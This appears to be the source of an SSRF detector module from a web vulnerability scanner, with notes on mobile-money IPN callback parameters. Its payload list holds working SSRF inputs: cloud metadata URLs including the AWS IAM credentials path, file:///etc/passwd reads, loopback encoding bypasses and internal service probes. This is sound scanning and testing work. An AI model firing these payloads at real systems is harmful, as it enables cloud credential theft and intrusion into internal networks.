"""
ssrf.py — Server-Side Request Forgery (SSRF) Detector

Covers:
  - Basic SSRF via URL parameters (fetch, url, redirect, callback)
  - Internal service probing (169.254.169.254, localhost, 10.x.x.x)
  - Blind SSRF via DNS/HTTP callback timing
  - SSRF via IPN/webhook callbackUrl parameters (critical in EA fintech)
  - Cloud metadata endpoint SSRF (AWS, GCP, Azure)
  - Protocol smuggling (file://, gopher://, dict://)

EA context:
  IPN callbackUrl parameters in mobile money integrations are the
  highest-value SSRF vector in Uganda — they often make server-side
  HTTP requests to attacker-controlled URLs.
"""

from __future__ import annotations

import re
from typing import List

from core.detection.base_detector import BaseDetector, DetectorMeta, Payload
from core.models.finding import VulnType

_CVSS_SSRF      = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"   # 8.2
_CVSS_SSRF_BLIND= "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"   # 3.7

# Internal/metadata IP response indicators
_INTERNAL_RESPONSE = r"(?i)(169\.254\.169\.254|metadata|ami-id|instance-id|ec2|gce|azure|local-ipv4|security-credentials)"
_CLOUD_META = r"(?i)(ami-id|instance-type|local-hostname|security-credentials|iam/security-credentials|computeMetadata)"

# Common SSRF-injectable parameter names
_SSRF_PARAMS = frozenset([
    "url", "uri", "src", "source", "dest", "destination",
    "redirect", "next", "return", "returnUrl", "return_url",
    "callback", "callbackUrl", "callback_url", "webhook", "webhookUrl",
    "notify", "notifyUrl", "notify_url", "ipn", "ipnUrl",
    "endpoint", "target", "host", "domain", "fetch", "load",
    "file", "path", "image", "img", "avatar", "logo",
    "feed", "import", "export", "proxy", "forward",
])


class SSRFDetector(BaseDetector):

    @property
    def meta(self) -> DetectorMeta:
        return DetectorMeta(
            detector_id="ssrf",
            name="Server-Side Request Forgery",
            description="Detects SSRF via URL params, callback endpoints, and cloud metadata probing",
            vuln_types=[VulnType.SSRF],
            owasp_categories=["A10:2021 – Server-Side Request Forgery"],
            estimated_requests_per_endpoint=8,
        )

    @property
    def payloads(self) -> List[Payload]:
        return [
            # ── Cloud metadata ──────────────────────────────────────────────────
            Payload(
                value="http://169.254.169.254/latest/meta-data/",
                description="AWS EC2 metadata endpoint",
                evidence_pattern=_CLOUD_META,
                false_positive_pattern=r"(?i)(blocked|denied|not allowed|filtered)",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.45,
            ),
            Payload(
                value="http://metadata.google.internal/computeMetadata/v1/",
                description="GCP metadata endpoint",
                evidence_pattern=_CLOUD_META,
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.45,
            ),
            Payload(
                value="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                description="AWS IAM credentials via metadata",
                evidence_pattern=r"(?i)(AccessKeyId|SecretAccessKey|Token|Expiration)",
                vuln_type=VulnType.SSRF,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",  # 9.8
                confidence_boost=0.5,
            ),
            # ── Localhost / internal network ───────────────────────────────────
            Payload(
                value="http://localhost/",
                description="localhost probe",
                evidence_pattern=r"(?i)(apache|nginx|iis|server|html|welcome|index)",
                false_positive_pattern=r"(?i)(blocked|not allowed|invalid url)",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.35,
            ),
            Payload(
                value="http://127.0.0.1/",
                description="127.0.0.1 loopback probe",
                evidence_pattern=r"(?i)(apache|nginx|iis|server|html|welcome)",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.35,
            ),
            Payload(
                value="http://10.0.0.1/",
                description="RFC1918 10.x internal probe",
                evidence_pattern=r"(?i)(apache|nginx|router|admin|login|dashboard)",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.3,
            ),
            Payload(
                value="http://192.168.1.1/",
                description="RFC1918 192.168.x internal probe",
                evidence_pattern=r"(?i)(router|admin|gateway|login|dashboard)",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.3,
            ),
            # ── Protocol smuggling ─────────────────────────────────────────────
            Payload(
                value="file:///etc/passwd",
                description="file:// protocol — Linux passwd",
                evidence_pattern=r"root:.*:/bin|nobody:.*:/",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.45,
            ),
            Payload(
                value="file:///C:/Windows/win.ini",
                description="file:// protocol — Windows win.ini",
                evidence_pattern=r"(?i)(\[fonts\]|\[extensions\])",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.45,
            ),
            # ── DNS rebinding / bypass ─────────────────────────────────────────
            Payload(
                value="http://[::1]/",
                description="IPv6 loopback bypass",
                evidence_pattern=r"(?i)(apache|nginx|iis|server|html)",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.3,
            ),
            Payload(
                value="http://0x7f000001/",
                description="Hex-encoded 127.0.0.1 bypass",
                evidence_pattern=r"(?i)(apache|nginx|html|server)",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.3,
            ),
            # ── EA fintech: IPN/callback SSRF ──────────────────────────────────
            Payload(
                value="http://localhost:8080/internal/admin",
                description="IPN callbackUrl SSRF — internal admin probe",
                evidence_pattern=r"(?i)(admin|dashboard|internal|management|api)",
                vuln_type=VulnType.SSRF,
                cvss_vector=_CVSS_SSRF,
                confidence_boost=0.35,
            ),
            Payload(
                value="http://localhost:3306/",
                description="IPN callbackUrl SSRF — MySQL direct probe",
                evidence_pattern=r"(?i)(mysql|mariadb|database|connection|host)",
                vuln_type=VulnType.SSRF,
                confidence_boost=0.4,
            ),
            # ── Out-of-band (OOB) SSRF ─────────────────────────────────────────
            Payload(
                value="{{OOB_URL}}",
                description="OOB callback — blind SSRF verification",
                evidence_pattern="",
                vuln_type=VulnType.SSRF,
                confidence_boost=0.5,
                is_blind=True,
            ),
        ]

    async def detect(self, target, crawl_result, injector) -> list:
        findings = []
        from core.scanner.oob import oob_service

        for param in crawl_result.parameters:
            if not self._should_test_parameter(param, crawl_result):
                continue

            # Prioritise known SSRF-injectable parameter names
            is_ssrf_param = param.name.lower() in {p.lower() for p in _SSRF_PARAMS}
            is_url_value  = self._looks_like_url(param.value)

            if not (is_ssrf_param or is_url_value):
                continue

            # 1. Establish baseline for this parameter
            baseline = await self._get_baseline(injector, crawl_result, param)

            for payload in self.payloads:
                # ... payload filtering logic ...
                is_fintech_payload = "ipn" in payload.description.lower() or "callback" in payload.description.lower()
                if is_fintech_payload and param.name.lower() not in (
                    "callbackurl", "callback_url", "notifyurl", "ipnurl", "webhookurl"
                ):
                    continue

                # Handle OOB placeholders
                current_payload_value = payload.value
                oob_token = None
                if "{{OOB_URL}}" in current_payload_value:
                    oob_token = oob_service.generate_token(self.meta.detector_id)
                    current_payload_value = current_payload_value.replace(
                        "{{OOB_URL}}", oob_service.get_callback_url(oob_token)
                    )

                # Create a modified payload object for this specific test
                from core.detection.base_detector import Payload as PayloadObj
                test_payload = PayloadObj(
                    value=current_payload_value,
                    description=payload.description,
                    evidence_pattern=payload.evidence_pattern,
                    false_positive_pattern=payload.false_positive_pattern,
                    vuln_type=payload.vuln_type,
                    cvss_vector=payload.cvss_vector,
                    confidence_boost=payload.confidence_boost,
                    is_blind=payload.is_blind,
                    delay_seconds=payload.delay_seconds, # Preserve delay_seconds
                )

                hit = await self._test_payload(injector, crawl_result, param, test_payload, baseline)
                if hit:
                    self._log_hit(self.meta.detector_id, crawl_result.url, param.name, payload.description)
                    ea_ctx = self._ea_context(param, target)
                    finding = self._build_finding(hit, ea_context=ea_ctx)
                    
                    # Attach OOB token for the validator to poll
                    if oob_token:
                        finding.oob_token = oob_token
                        finding.confidence = 0.4  # Base confidence before validation
                    
                    findings.append(finding)
                    break

        return findings

    @staticmethod
    def _looks_like_url(value: str) -> bool:
        return bool(value and re.match(r"^https?://", value, re.IGNORECASE))

    @staticmethod
    def _ea_context(param, target) -> dict:
        is_callback = param.name.lower() in (
            "callbackurl", "callback_url", "notifyurl", "ipnurl",
            "webhookurl", "webhook_url",
        )
        is_ea = getattr(target, "is_ea_target", False)
        return {
            "ea_relevant": is_ea or is_callback,
            "attack_impact": (
                "SSRF via IPN callbackUrl allows an attacker to send fake "
                "payment notifications from the server, confirming orders "
                "without real payment — critical in mobile money integrations."
            ) if is_callback else (
                "SSRF allows probing of internal services and cloud metadata."
            ),
            "max_regulatory_multiplier": 1.4 if is_callback else 1.2,
        }